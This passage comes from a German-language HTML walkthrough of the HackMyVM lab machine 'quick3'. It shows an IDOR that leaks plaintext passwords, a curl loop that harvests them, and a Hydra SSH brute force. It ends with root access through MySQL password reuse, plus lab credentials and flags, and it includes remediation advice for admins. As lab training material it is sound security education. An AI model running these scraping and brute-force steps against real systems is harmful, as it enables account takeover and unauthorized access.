+ [80][http-post-form] host: que3.hmv   login: nick   password: Buoio <!-- Falsch-Positiv? -->
+ # ... (weitere) ...
+ 1 of 1 target successfully completed, 16 valid passwords found <!-- Irreführende Erfolgsmeldung -->
+ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-11 00:14:50
+                       </pre> <!-- Maskierung & -->
+                   </div>
+               </div>
+
+              <p class="analysis">
+                  <strong>Analyse:</strong> Nach einem vermuteten Login (möglicherweise mit `nick`/`benni`) wird auf `/customer/user.php?id=X` zugegriffen. Die Ausgabe zeigt Profilinformationen, einschließlich E-Mail und **Passwort im Klartext**, für die Benutzer mit IDs 1, 2 und 3. Anschließend wird ein Skript (vermutlich eine `bash` for-Schleife mit `curl`) verwendet, um die IDs 1 bis 30 abzufragen und die Passwörter und Benutzernamen aus dem HTML-Quellcode der jeweiligen `user.php?id=X`-Seite zu extrahieren und in Dateien (`kennworter.txt`, `neueuser.txt`) zu speichern.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> **Kritische Informationspreisgabe / IDOR (Insecure Direct Object Reference)!** Die `user.php`-Seite erlaubt offenbar den Zugriff auf Benutzerdaten nur anhand der ID im GET-Parameter, ohne zu prüfen, ob der angemeldete Benutzer überhaupt berechtigt ist, diese Daten zu sehen. Noch schlimmer ist, dass die **Passwörter im Klartext im HTML-Quellcode** (wahrscheinlich in versteckten Feldern oder Attributen) gespeichert sind. Dies ermöglicht das Auslesen aller Benutzerpasswörter durch Iteration der ID. Die extrahierten Listen enthalten nun gültige Benutzernamen und die dazugehörigen Klartext-Passwörter.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Verwende die extrahierten Credentials (gespeichert in `neueuser.txt` und `kennworter.txt`) für einen gezielten `hydra`-Angriff auf SSH, um einen Shell-Zugang zu erhalten.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> **Beheben Sie die IDOR-Schwachstelle sofort!** Stellen Sie sicher, dass `user.php` prüft, ob der anfragende Benutzer berechtigt ist, die Daten der angeforderten ID einzusehen. **Entfernen Sie die Klartext-Passwörter aus dem HTML-Quellcode und aus der Datenbank.** Hashen und salzen Sie alle Passwörter sicher in der Datenbank. Führen Sie einen Sicherheitsaudit des gesamten Kundenportals durch.
+              </p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <pre>
+ # Manuelle Prüfung oder Ergebnis nach Login
+ http://que3.hmv/customer/user.php?id=2
+ # Enthält im Quellcode Infos wie:
+ 1 Quick@quick.hmv q27QA6FeisAAtbW
+ 2 Nick Greenhorn H01n8X0fiiBhsNbI
+ 3 andrew.speed@quick.hmv oyS6518WQxGK8rmk
+ # ... etc.
+
+ # Skript zum Extrahieren der Passwörter (Beispiel für Passwort-Extraktion)
+ # foreach i in {1..30}; do curl -s --cookie "PHPSESSID=..." http://quick.hmv/customer/user.php?id=$i | grep 'oldpassword' | grep 'value' | awk '{print $5}' | tr -d '"' | tr "=" " " | awk '{print $2}' >> kennworter.txt; done
+                       </pre>
+                   </div>
+               </div>
+                <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~/Hackingtools/php_filter_chain_generator]
+   └─# <span class="command">cat kennworter.txt</span>
+                       </div>
+                       <pre>
+ q27QA6FeisAAtbW
+ H01n8X0fiiBhsNbI
+ oyS6518WQxGK8rmk
+ 2n5kKKcvumiR7vrz
+ <span class="password">6G3UCx6aH6UYvJ6m</span> <!-- Passwort für mike -->
+ k2I9CR15E94G1KI
+ 62D4hqCrjjNCuxj
+ w9Y021wsWRdkwuKf
+ 1vC35FcnMfmGsI5c
+ fL01z7z8MawnIdAq
+ vDKZtVfZuaLN8BEB7f
+ iakbmsaEVHhN2XoaXB
+ wv5awQybZTdvZeMGPb
+ wv5awQybZTdvZeMGPb
+ Kn4tLAPWDbFK9Zv2
+ SS2mcbW58a8reLYQ
+ e8v3JQv3QVA3aNrD
+ 8RMVrdd82n5ymc4Z
+ STUK2LNwNRU24YZt
+ mvQnTzCX9wcNtzbW
+ A9n3XMuB9XmFmgr5
+ DX5cM3yFg6wJgdYb
+ yT9Hy2fhX7VhmEkj
+ aCSKXmzhHL9XPnqr
+ GUFTV4ERd7QAexxw
+ fMYFNFzCRMF6ceKe
+ w5dWfAqNNLtWVvcW
+ FVYtCpc8FGVHEBXV
+ benni1908
+                       </pre>
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~/Hackingtools/php_filter_chain_generator]
+   └─# <span class="command">cat neueuser.txt</span>
+                       </div>
+                       <pre>
+ info@quick
+ nick
+ andrew
+ jack
+ mike
+ j
+ jane_smith@email
+ frank@email
+ fred
+ s
+ b
+ j
+ d
+ m
+ jeff
+ lee
+ laura
+ coos
+ n
+ t
+ k
+ juan
+ john
+ misty
+ lara
+ j
+ dick_swett@email
+                       </pre>
+                   </div>
+               </div>
+          </section>
+
+         <section id="initial-access">
+             <h2>Initial Access (SSH Login)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Mit den extrahierten Benutzernamen (`neueuser.txt`) und Klartext-Passwörtern (`kennworter.txt`) wird ein `hydra`-Brute-Force-Angriff auf den SSH-Dienst (Port 22) gestartet.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> **Erfolg!** Hydra findet gültige SSH-Credentials: Benutzer `mike` mit Passwort `<span class="password">6G3UCx6aH6UYvJ6m</span>`.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Melde dich sofort per SSH als `mike` an, um eine Shell auf dem System zu erhalten.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Alle kompromittierten Passwörter sofort ändern!** Die IDOR-Schwachstelle und die Klartext-Passwörter müssen dringend behoben werden. Implementieren Sie starke Passwortrichtlinien und erwägen Sie Key-basierte SSH-Authentifizierung.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~/Hackingtools/php_filter_chain_generator]
+ └─# <span class="command">hydra -L neueuser.txt -P kennworter.txt ssh://192.168.2.124:22 -t 64</span>
+                     </div>
+                     <pre>
+ Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-11 01:06:27
+ [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+ [DATA] max 64 tasks per 1 server, overall 64 tasks, 840 login tries (l:28/p:30), ~14 tries per task
+ [DATA] attacking ssh://192.168.2.124:22/
+ ~
+ [22][ssh] host: 192.168.2.124   login: mike   password: <span class="password">6G3UCx6aH6UYvJ6m</span>
+ ~
+ [STATUS] attack finished for 192.168.2.124 (waiting for children to complete tests)
+ 1 of 1 target completed, 1 valid password found
+ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-11 01:06:55 <!-- Zeit angepasst -->
+                     </pre>
+                 </div>
+             </div>
+
+              <p class="analysis">
+                  <strong>Analyse:</strong> Der SSH-Login als Benutzer `mike` mit dem gefundenen Passwort wird durchgeführt.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> **Initial Access erfolgreich!** Der Login gelingt, und eine Shell als Benutzer `mike` auf dem Zielsystem `quick3` wird erhalten.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration als `mike`. Überprüfe `id`, `sudo -l`, Home-Verzeichnis, SUID/GUID-Dateien etc.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> Passwort für `mike` ändern und die Ursache der Kompromittierung (Klartextpasswörter) beheben.
+              </p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~]
+  └─# <span class="command">ssh mike@quick.hmv</span> <!-- Hostname korrigiert -->
+                      </div>
+                      <pre>
+  mike@quick.hmv's password: <span class="command">6G3UCx6aH6UYvJ6m</span>
+  Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
+
+  # ... (Login Banner) ...
+
+  Last login: Wed Jan 24 12:56:53 2024 from 10.0.2.15
+  mike@quick3:~$
+                      </pre>
+                  </div>
+              </div>
+         </section>
+
+       <section id="poc-initial-access">
+            <h2>Proof of Concept (Initial Access - Credential Disclosure & SSH)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Dieser POC fasst die Schritte zusammen, wie durch eine IDOR-Schwachstelle Klartext-Passwörter offengelegt und diese für den SSH-Zugriff verwendet wurden.
+             </p>
+             <p>
+                 <strong>Schwachstellen:</strong>
+                 <ol>
+                     <li>IDOR (Insecure Direct Object Reference) in `/customer/user.php`: Zugriff auf Benutzerdaten ist nur über die User-ID im GET-Parameter möglich, ohne Autorisierungsprüfung.</li>
+                     <li>Speicherung von Passwörtern im Klartext im HTML-Quellcode der `user.php`-Seiten.</li>
+                 </ol>
+             </p>
+             <p>
+                 <strong>Voraussetzungen:</strong> Webzugriff auf das Kundenportal (`/customer/`). Kenntnis des URL-Musters (`user.php?id=X`). Eine gültige Session-ID (optional, falls die Seite einen Login erfordert, der hier aber nicht gezeigt/nötig war, um die IDOR auszunutzen).
+             </p>
+             <p>
+                 <strong>Schritte zur Reproduktion:</strong>
+                 <ol>
+                     <li>Identifiziere die URL `/customer/user.php?id=X`.</li>
+                     <li>Iteriere durch User-IDs (z.B. 1 bis 30) mittels eines Skripts oder manuell mit `curl`: `curl http://que3.hmv/customer/user.php?id=[ID]`.</li>
+                     <li>Parse den HTML-Quellcode jeder Antwort, um Benutzernamen/E-Mails und die Klartext-Passwörter zu extrahieren (z.B. aus einem `input type="hidden" name="oldpassword" value="PASSWORD"`).</li>
+                     <li>Sammle die Credentials in Listen.</li>
+                     <li>Verwende die gefundenen Credentials (z.B. `mike` / `6G3UCx6aH6UYvJ6m`), um dich per SSH anzumelden: `ssh mike@que3.hmv`.</li>
+                 </ol>
+             </p>
+             <p>
+                 <strong>Erwartetes Ergebnis:</strong> Eine Liste mit gültigen Benutzernamen und deren Klartext-Passwörtern wird erhalten. Mindestens ein Satz dieser Credentials ermöglicht den erfolgreichen SSH-Login.
+             </p>
+              <p class="recommendation">
+                 <strong>Empfehlung (Admin):</strong> **Beheben Sie die IDOR-Schwachstelle** durch Implementierung einer serverseitigen Autorisierungsprüfung (darf der angemeldete Benutzer die Daten für ID X sehen?). **Entfernen Sie Klartext-Passwörter** aus dem HTML und der Datenbank. **Hashen und salzen Sie alle Passwörter.** Führen Sie einen Sicherheitsaudit durch.
+             </p>
+         </section>
+
+         <section id="privilege-escalation-enum">
+             <h2>Privilege Escalation Enumeration (as mike)</h2>
+              <p class="analysis">
+                  <strong>Analyse:</strong> Als Benutzer `mike` werden grundlegende Enumerationsbefehle ausgeführt: `id`, `sudo -l`, SUID-Dateien (`find`), Capabilities (`getcap`), Crontab (`cat /etc/crontab`), Auflisten von `/home/` und des eigenen Home-Verzeichnisses (`ls -la`), Auslesen von `user.txt`.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong>
+                  *   `id`: Bestätigt Benutzer `mike` (uid/gid 1002).
+                  *   `sudo -l`: `mike` hat keine `sudo`-Rechte.
+                  *   SUID/Capabilities: Keine offensichtlichen ungewöhnlichen oder leicht ausnutzbaren Dateien gefunden.
+                  *   Crontab: Enthält nur Standard-System-Cronjobs.
+                  *   Home-Verzeichnis: Enthält die User-Flag `user.txt`.
+                  *   **User-Flag:** Wird erfolgreich gelesen: `<span class="password">HMV{717f274ee66f8541a3031f175f615e72}</span>` (eingebettet in ASCII-Art).
+                  Auf den ersten Blick scheint es keine einfachen Privesc-Pfade zu geben.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> User-Flag ist gesichert. Da Standard-Enumeration keine offensichtlichen Vektoren liefert, suche tiefer: Konfigurationsdateien (insbesondere für Webserver und Datenbank), Datenbankinhalte (erneut prüfen, falls `www-data` nicht alles sehen konnte), laufende Prozesse, Netzwerkverbindungen. Überprüfe die leere `config.php` im `/customer`-Verzeichnis erneut – vielleicht hat `mike` mehr Rechte?
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer keine unnötigen sudo-Rechte haben. Überprüfen Sie regelmäßig SUID/GUID-Dateien und Cronjobs. Sichern Sie Konfigurationsdateien mit korrekten Berechtigungen.
+              </p>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ mike@quick3:~$ <span class="command">id</span>
+                       </div>
+                       <pre>
+ uid=1002(mike) gid=1002(mike) groups=1002(mike)
+                       </pre>
+                   </div>
+               </div>
+                <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ mike@quick3:~$ <span class="command">sudo -l</span>
+                       </div>
+                       <pre>
+ [sudo] password for mike: <span class="command">6G3UCx6aH6UYvJ6m</span>
+ Sorry, user mike may not run sudo on quick3.
+                       </pre>
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ mike@quick3:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+                       </div>
+                       <pre>
+       293    133 -rwsr-xr-x   1 root     root       135928 Mar 21 21:14 /snap/snapd/21465/usr/lib/snapd/snap-confine
+       # ... (Standard SUID/Snap Dateien) ...
+     1112    228 -rwsr-xr-x   1 root     root              232416 Apr  3  2023 /usr/bin/sudo
+       # ... (Standard SUID Dateien) ...
+     38991    332 -rwsr-xr-x   1 root     root              338536 Jan  2 16:54 /usr/lib/openssh/ssh-keysign
+                       </pre>
+                   </div>
+               </div>
+                <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ mike@quick3:~$ <span class="command">getcap -r / 2>/dev/null</span>
+                       </div>
+                       <pre>
+ /snap/core20/1974/usr/bin/ping cap_net_raw=ep
+ /snap/core20/2105/usr/bin/ping cap_net_raw=ep
+ /usr/bin/ping cap_net_raw=ep
+ /usr/bin/mtr-packet cap_net_raw=ep
+ /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+                       </pre>
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ mike@quick3:~$ <span class="command">cat /etc/crontab</span>
+                       </div>
+                       <pre>
+ # /etc/crontab: system-wide crontab
+ # ... (Kommentare) ...
+ SHELL=/bin/sh
+ #PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+ # ... (Standard cron Einträge) ...
+ 17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+ 25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+ 47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+ 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+ #
+                       </pre>
+                   </div>
+               </div>
+                <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ mike@quick3:~$ <span class="command">ls /home/</span>
+                       </div>
+                       <pre>
+ andrew  coos  jeff  john  juan  lara  lee  mike  nick
+                       </pre>
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ mike@quick3:~$ <span class="command">ls -la</span>
+                       </div>
+                       <pre>
+ total 36
+ drwxr-x---  4 mike mike 4096 Jan 24 12:56 .
+ drwxr-xr-x 11 root root 4096 Jan 24 10:38 ..
+ lrwxrwxrwx  1 mike mike    9 Jan 24 10:46 .bash_history -> /dev/null
+ -rw-r--r--  1 mike mike  220 Jan 21 13:57 .bash_logout
+ -rw-r--r--  1 mike mike 3797 Jan 24 12:56 .bashrc
+ drwx------  2 mike mike 4096 Jan 21 14:00 .cache
+ drwxrwxr-x  3 mike mike 4096 Jan 21 13:58 .local
+ -rw-r--r--  1 mike mike  807 Jan 21 13:57 .profile
+ -rw-rw-r--  1 mike mike 4166 Jan 21 13:58 user.txt
+                       </pre>
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ mike@quick3:~$ <span class="command">cat user.txt</span>
+                       </div>
+                       <pre>
+ # ... (ASCII Art Q) ...
+
+ <span class="password">HMV{717f274ee66f8541a3031f175f615e72}</span>
+                       </pre>
+                   </div>
+               </div>
+           </section>
+
+           <section id="privilege-escalation">
+               <h2>Privilege Escalation (MySQL Password Reuse)</h2>
+                <p class="analysis">
+                    <strong>Analyse:</strong> Als Benutzer `mike` wird erneut die Datei `/var/www/html/customer/config.php` untersucht. Anschließend wird versucht, mit `su root` und dem darin gefundenen MySQL-Root-Passwort (`fastandquicktobefaster`) zum Root-Benutzer zu wechseln.
+                </p>
+                <p class="evaluation">
+                    <strong>Bewertung:</strong> Obwohl `www-data` die Datei bereits gelesen hat, überprüft `mike` sie erneut und findet dieselben MySQL-Credentials. **Der entscheidende Schritt ist der `su root`-Versuch mit dem MySQL-Root-Passwort. Dieser ist erfolgreich!** Das bedeutet, dass das System-Root-Passwort identisch mit dem MySQL-Root-Passwort ist. Dies ist eine häufige, aber sehr unsichere Praxis (Password Reuse).
+                </p>
+                <p class="recommendation">
+                    <strong>Empfehlung (Pentester):</strong> Root-Zugriff erlangt! Lese die Root-Flag.
+                    <br>
+                    <strong>Empfehlung (Admin):</strong> **Ändern Sie sofort das Root-Passwort des Systems UND das Root-Passwort der Datenbank!** Verwenden Sie niemals dasselbe Passwort für verschiedene Konten, insbesondere nicht für privilegierte Konten wie System-Root und Datenbank-Root. Sichern Sie Konfigurationsdateien mit minimalen Berechtigungen.
+                </p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ mike@quick3:/var/www/html/customer$ <span class="command">cat config.php</span>
+                       </div>
+                       <pre>
+ <?php
+ // config.php
+ $conn = new mysqli('localhost', 'root', '<span class="password">fastandquicktobefaster</span>', 'quick');
+
+ // Check connection
+ if ($conn->connect_error) {
+ 	die("Connection failed: " . $conn->connect_error);
+ }
+ ?>
+                       </pre> <!-- Maskierung < > ? -->
+                   </div>
+               </div>
+                <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt" style="color: yellow;">
+ mike@quick3:/var/www/html/customer$ <span class="command">su root</span>
+                        </div>
+                        <pre>
+ Password: <span class="command">fastandquicktobefaster</span>
+ root@quick3:/var/www/html/customer#
+                        </pre>
+                    </div>
+                </div>
+
+               <p class="analysis">
+                   <strong>Analyse:</strong> Als `root` wird ins Home-Verzeichnis gewechselt und der Inhalt von `root.txt` angezeigt.
+               </p>
+               <p class="evaluation">
+                   <strong>Bewertung:</strong> Die Root-Flag `<span class="password">HMV{f178761104e933f9341f13f64b38538a}</span>` (eingebettet in ASCII-Art) wird erfolgreich gelesen. Die Maschine ist vollständig kompromittiert.
+               </p>
+               <p class="recommendation">
+                   <strong>Empfehlung (Pentester):</strong> Bericht abschließen.
+                   <br>
+                   <strong>Empfehlung (Admin):</strong> System bereinigen, alle Passwörter ändern, Schwachstellen (IDOR, Klartext-Passwörter in DB/HTML, Passwort-Wiederverwendung) beheben.
+               </p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: red;">
+ root@quick3:/var/www/html/customer# <span class="command">cd ~</span>
+                       </div>
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: red;">
+ root@quick3:~# <span class="command">ls</span>
+                       </div>
+                       <pre>
+ dash  root.txt  snap
+                       </pre>
+                   </div>
+               </div>
+                <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: red;">
+ root@quick3:~# <span class="command">cat root.txt</span>
+                       </div>
+                       <pre>
+ # ... (ASCII Art Q) ...
+
+ <span class="password">HMV{f178761104e933f9341f13f64b38538a}</span>
+                       </pre>
+                   </div>
+               </div>
+           </section>
+
+          <section id="poc-privesc">
+              <h2>Proof of Concept (Privilege Escalation - MySQL Password Reuse)</h2>
+               <p class="analysis">
+                  <strong>Analyse:</strong> Dieser POC beschreibt die Erlangung von Root-Rechten durch Ausnutzung der Wiederverwendung des MySQL-Root-Passworts als System-Root-Passwort.
+              </p>
+               <p>
+                  <strong>Schwachstellen:</strong>
+                  <ol>
+                      <li>Klartext-Speicherung des MySQL-Root-Passworts in der Web-Konfigurationsdatei (`/var/www/html/customer/config.php`).</li>
+                      <li>Wiederverwendung des MySQL-Root-Passworts für das System-Root-Konto.</li>
+                      <li>Unsichere Dateiberechtigungen oder anderer Vektor, der einem niedrig privilegierten Benutzer (hier `mike`, zuvor `www-data`) das Lesen der Konfigurationsdatei ermöglicht.</li>
+                  </ol>
+              </p>
+              <p>
+                  <strong>Voraussetzungen:</strong> Shell-Zugriff als Benutzer, der die Datei `/var/www/html/customer/config.php` lesen kann (hier `mike`).
+              </p>
+              <p>
+                  <strong>Schritte zur Reproduktion:</strong>
+                  <ol>
+                      <li>Erlange eine Shell als Benutzer `mike` (z.B. via SSH nach IDOR/Credential-Leak).</li>
+                      <li>Lese die Datenbank-Konfigurationsdatei: `cat /var/www/html/customer/config.php`.</li>
+                      <li>Extrahiere das MySQL-Root-Passwort (hier: `fastandquicktobefaster`).</li>
+                      <li>Versuche, mit diesem Passwort zum System-Root-Benutzer zu wechseln: `su root`.</li>
+                  </ol>
+              </p>
+              <p>
+                  <strong>Erwartetes Ergebnis:</strong> Der `su`-Befehl ist erfolgreich und gewährt eine Root-Shell, da das Passwort wiederverwendet wurde.
+              </p>
+               <p class="recommendation">
+                  <strong>Empfehlung (Admin):</strong> **Verwenden Sie niemals dasselbe Passwort für verschiedene Konten**, insbesondere nicht für privilegierte Konten. **Ändern Sie das System-Root-Passwort und das MySQL-Root-Passwort** zu starken, einzigartigen Werten. **Speichern Sie Datenbank-Credentials nicht im Klartext** in Web-Konfigurationsdateien; verwenden Sie sicherere Methoden (Umgebungsvariablen, Konfigurationsmanagement-Tools, Vaults). **Beschränken Sie Dateiberechtigungen** auf das notwendige Minimum.
+              </p>
+          </section>
+
+         <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                  <div class="flag-entry">
+                     <div class="flag-command">cat /home/mike/user.txt</div> <!-- Korrigierter Pfad -->
+                     <div class="flag-value"><span class="password">HMV{717f274ee66f8541a3031f175f615e72}</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMV{f178761104e933f9341f13f64b38538a}</span></div>
+                 </div>
+             </div>
+         </section> 
+
+     <footer class="footer">
+         <p>DarkSpirit - Cyber Security Reports</p>
+         <p>Berichtsdatum: 2024-05-10</p> <!-- Datum aus Nmap Scan -->
+     </footer>
+ </body>
+ </html>
